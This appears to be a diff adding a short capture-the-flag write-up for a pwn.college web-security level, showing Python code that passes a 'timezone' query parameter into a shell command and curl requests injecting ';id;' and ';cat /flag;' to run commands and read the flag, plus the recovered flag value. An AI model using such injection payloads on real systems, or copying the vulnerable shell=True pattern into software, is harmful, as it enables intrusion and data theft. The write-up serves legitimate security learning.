@@ -1,0 +1,27 @@
+# Level 2
+
+we are given with a task to `Exploit a command injection vulnerability` 💉
+
+We are given with the machine and souce code of the challenge
+
+```py {3} copy
+def level2():
+    timezone = request.args.get("timezone", "UTC")
+    return subprocess.check_output(f"TZ={timezone} date", shell=True, encoding="latin")
+```
+
+We can see that the `timezone` parameter is passed to the `TZ` environment variable and then the `date` command is executed
+Its a simple command injection vulnerability
+
+We can use `;<command>;` to execute multiple commands
+
+```sh
+hacker@web-security-level-2:~$ curl -X GET "http://challenge.localhost/?timezone=;id;"
+uid=0(root) gid=1000(hacker) groups=1000(hacker)
+```
+Retriveing flag
+```sh
+hacker@web-security-level-2:~$ curl -X GET "http://challenge.localhost/?timezone=;cat%20/flag;"
+pwn.college{kEStc55WSBI8_z_G5tHSe0-T_oL.dhDOzMDL0IzMyMzW}
+
+```
